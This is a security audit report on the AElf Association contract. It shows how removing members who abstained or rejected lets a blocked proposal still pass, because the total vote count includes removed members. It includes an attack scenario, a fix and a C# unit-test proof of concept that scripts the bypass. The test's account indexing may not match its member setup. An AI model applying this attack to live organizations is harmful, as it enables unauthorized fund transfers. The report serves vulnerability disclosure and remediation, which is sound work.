# Audit Report

## Title
Inconsistent Vote Counting Allows Governance Threshold Bypass Through Member Removal

## Summary
The Association contract contains a critical inconsistency in vote threshold validation that allows attackers to bypass `MaximalAbstentionThreshold` and `MaximalRejectionThreshold` by removing opposing members after they vote. While abstention/rejection checks correctly filter by current membership, the minimum vote threshold counts ALL votes including those from removed members.

## Finding Description

The vulnerability exists in the vote counting logic that determines whether a proposal can be released. The contract inconsistently applies membership filtering across different threshold checks.

The `IsProposalAbstained()` function correctly filters abstentions to only count votes from current organization members: [1](#0-0) 

Similarly, `IsProposalRejected()` filters rejections by current membership: [2](#0-1) 

However, in `CheckEnoughVoteAndApprovals()`, while approvals are correctly filtered by current membership at line 49, the total vote count at lines 55-57 does NOT filter by current membership: [3](#0-2) 

This inconsistency is exploitable because `RemoveMember()` can be called (via proposal execution) to remove members who have already voted, without any validation of active proposals or vote invalidation: [4](#0-3) 

Votes are stored in `repeated aelf.Address` fields that persist even after member removal: [5](#0-4) 

The attack flow:
1. Malicious proposal P1 is created and voted on
2. Honest members abstain/reject, blocking the proposal due to threshold violations
3. Attackers create and pass proposal P2 to remove the opposing members
4. Proposal P1 now passes because:
   - Abstentions/rejections from removed members no longer count (filtered checks pass)
   - But their votes still count toward `MinimalVoteThreshold` (unfiltered check passes)
   - Approvals from current members meet `MinimalApprovalThreshold`

This behavior is inconsistent with the Parliament contract, which correctly filters total votes by current membership: [6](#0-5) 

## Impact Explanation

This vulnerability allows attackers to completely bypass two critical governance safeguards designed to protect against minority-opposed proposals:
- `MaximalAbstentionThreshold`: Blocks proposals with too many abstentions (indicating lack of engagement)
- `MaximalRejectionThreshold`: Blocks proposals with too much active opposition

Concrete attack scenario:
- Organization with 15 members, thresholds: `MinimalVoteThreshold=10`, `MinimalApprovalThreshold=6`, `MaximalAbstentionThreshold=3`
- Attackers control 6 members, honest members are 9
- Malicious proposal P1 created: 6 approve, 7 abstain
- P1 correctly blocked (7 abstentions > 3 threshold)
- Attackers pass proposal P2 removing the 7 abstaining members
- P1 now evaluates as: Total votes=13 (includes removed members) ≥ 10, Approvals from current=6 ≥ 6, Abstentions from current=0 ≤ 3
- P1 executes despite originally failing governance checks

This compromises Association governance integrity, potentially leading to unauthorized fund transfers, configuration changes, or other malicious actions that the organization's threshold design intended to prevent.

## Likelihood Explanation

The attack is highly practical with realistic preconditions:

**Entry Points:** Standard public methods defined in the ACS3 interface: [7](#0-6) 

**Feasible Preconditions:** 
- Attackers need sufficient members to meet `MinimalApprovalThreshold` for both proposals
- Access to proposer whitelist (often granted to organization members)
- Realistic for scenarios where attackers have significant but not complete organizational control (e.g., 40-50% of members)

**Execution Practicality:** The attack uses only standard governance operations without special privileges beyond normal proposal execution rights. RemoveMember is executed via proposal mechanism as shown in the implementation.

**Detection:** While the attack leaves on-chain evidence, by the time it's detected, the malicious proposal has already executed.

**Economic Rationality:** If the malicious proposal yields sufficient value (e.g., transferring organization treasury funds), the cost of executing two proposals is negligible.

## Recommendation

Modify `CheckEnoughVoteAndApprovals()` to filter the total vote count by current membership, consistent with the abstention and rejection checks:

```csharp
private bool CheckEnoughVoteAndApprovals(ProposalInfo proposal, Organization organization)
{
    var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
    var isApprovalEnough =
        approvedMemberCount >= organization.ProposalReleaseThreshold.MinimalApprovalThreshold;
    if (!isApprovalEnough)
        return false;

    // Filter total votes by current membership (FIXED)
    var isVoteThresholdReached =
        proposal.Abstentions.Concat(proposal.Approvals).Concat(proposal.Rejections)
            .Count(organization.OrganizationMemberList.Contains) >=
        organization.ProposalReleaseThreshold.MinimalVoteThreshold;
    return isVoteThresholdReached;
}
```

This ensures consistency with Parliament's implementation and prevents the bypass.

## Proof of Concept

```csharp
[Fact]
public async Task VoteCountingInconsistency_MemberRemoval_Bypass_Test()
{
    // Setup: 15 members total, thresholds designed to require broad support
    var members = new[] { Reviewer1, Reviewer2, Reviewer3 }.Concat(
        Enumerable.Range(4, 12).Select(i => Address.FromPublicKey(Accounts[i].KeyPair.PublicKey))
    ).ToArray();
    
    var organizationAddress = await CreateOrganizationAsync(
        minimalApprovalThreshold: 6,  // Need 6 approvals
        minimalVoteThreshold: 10,      // Need 10 total votes
        maximalAbstentionThreshold: 3, // Block if >3 abstentions
        maximalRejectionThreshold: 3,  // Block if >3 rejections
        members
    );

    // P1: Malicious proposal (e.g., transfer funds)
    var proposalP1 = await CreateProposalAsync(Reviewer1KeyPair, organizationAddress);
    
    // 6 attackers approve P1
    for(int i = 0; i < 6; i++)
        await ApproveAsync(Accounts[i].KeyPair, proposalP1);
    
    // 7 honest members abstain (blocks proposal: 7 > 3 threshold)
    for(int i = 6; i < 13; i++)
        await AbstainAsync(Accounts[i].KeyPair, proposalP1);
    
    // Verify P1 is blocked
    var p1Status = await AssociationContractStub.GetProposal.CallAsync(proposalP1);
    p1Status.ToBeReleased.ShouldBeFalse(); // Correctly blocked by abstention threshold
    
    // P2: Remove the 7 abstaining members
    for(int i = 6; i < 13; i++)
    {
        var removeProposal = await CreateAssociationProposalAsync(
            Reviewer1KeyPair,
            Accounts[i].Address,
            nameof(AssociationContractStub.RemoveMember),
            organizationAddress
        );
        
        // Pass removal proposal with 6 attacker votes
        for(int j = 0; j < 6; j++)
            await ApproveAsync(Accounts[j].KeyPair, removeProposal);
        
        await GetAssociationContractTester(Reviewer1KeyPair).Release.SendAsync(removeProposal);
    }
    
    // BUG: P1 now passes despite originally being blocked!
    // Total votes still counts removed members (13 ≥ 10)
    // But abstentions from current members = 0 (≤ 3)
    var p1StatusAfterRemoval = await AssociationContractStub.GetProposal.CallAsync(proposalP1);
    p1StatusAfterRemoval.ToBeReleased.ShouldBeTrue(); // VULNERABILITY: Now passes!
    
    // P1 can be released, bypassing governance safeguards
    var releaseResult = await GetAssociationContractTester(Reviewer1KeyPair).Release.SendAsync(proposalP1);
    releaseResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
}
```

## Notes

This vulnerability is **specific to the Association contract** and does not affect Parliament or Referendum contracts. The Parliament contract correctly filters total votes by current membership, proving this is an unintended inconsistency in Association's implementation. The issue fundamentally undermines the security guarantees that `MaximalAbstentionThreshold` and `MaximalRejectionThreshold` are designed to provide, allowing minority control to override opposition through procedural manipulation.

### Citations

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L34-39)
```csharp
    private bool IsProposalRejected(ProposalInfo proposal, Organization organization)
    {
        var rejectionMemberCount =
            proposal.Rejections.Count(organization.OrganizationMemberList.Contains);
        return rejectionMemberCount > organization.ProposalReleaseThreshold.MaximalRejectionThreshold;
    }
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L41-45)
```csharp
    private bool IsProposalAbstained(ProposalInfo proposal, Organization organization)
    {
        var abstentionMemberCount = proposal.Abstentions.Count(organization.OrganizationMemberList.Contains);
        return abstentionMemberCount > organization.ProposalReleaseThreshold.MaximalAbstentionThreshold;
    }
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L47-59)
```csharp
    private bool CheckEnoughVoteAndApprovals(ProposalInfo proposal, Organization organization)
    {
        var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
        var isApprovalEnough =
            approvedMemberCount >= organization.ProposalReleaseThreshold.MinimalApprovalThreshold;
        if (!isApprovalEnough)
            return false;

        var isVoteThresholdReached =
            proposal.Abstentions.Concat(proposal.Approvals).Concat(proposal.Rejections).Count() >=
            organization.ProposalReleaseThreshold.MinimalVoteThreshold;
        return isVoteThresholdReached;
    }
```

**File:** contract/AElf.Contracts.Association/Association.cs (L266-280)
```csharp
    public override Empty RemoveMember(Address input)
    {
        var organization = State.Organizations[Context.Sender];
        Assert(organization != null, "Organization not found.");
        var removeResult = organization.OrganizationMemberList.OrganizationMembers.Remove(input);
        Assert(removeResult, "Remove member failed.");
        Assert(Validate(organization), "Invalid organization.");
        State.Organizations[Context.Sender] = organization;
        Context.Fire(new MemberRemoved
        {
            OrganizationAddress = Context.Sender,
            Member = input
        });
        return new Empty();
    }
```

**File:** protobuf/association_contract.proto (L91-96)
```text
    // Address list of approved.
    repeated aelf.Address approvals = 8;
    // Address list of rejected.
    repeated aelf.Address rejections = 9;
    // Address list of abstained.
    repeated aelf.Address abstentions = 10;
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L94-102)
```csharp
    private bool IsVoteThresholdReached(ProposalInfo proposal, Organization organization,
        ICollection<Address> parliamentMembers)
    {
        var isVoteThresholdReached =
            proposal.Abstentions.Concat(proposal.Approvals).Concat(proposal.Rejections)
                .Count(parliamentMembers.Contains) * AbstractVoteTotal >=
            organization.ProposalReleaseThreshold.MinimalVoteThreshold * parliamentMembers.Count;
        return isVoteThresholdReached;
    }
```

**File:** protobuf/acs3.proto (L26-40)
```text
    // Approve a proposal according to the proposal ID.
    rpc Approve (aelf.Hash) returns (google.protobuf.Empty) {
    }
    
    // Reject a proposal according to the proposal ID.
    rpc Reject(aelf.Hash) returns (google.protobuf.Empty) {
    }

    // Abstain a proposal according to the proposal ID.
    rpc Abstain(aelf.Hash) returns (google.protobuf.Empty){
    }

    // Release a proposal according to the proposal ID and send a transaction to the specified contract.
    rpc Release(aelf.Hash) returns (google.protobuf.Empty){
    }
```
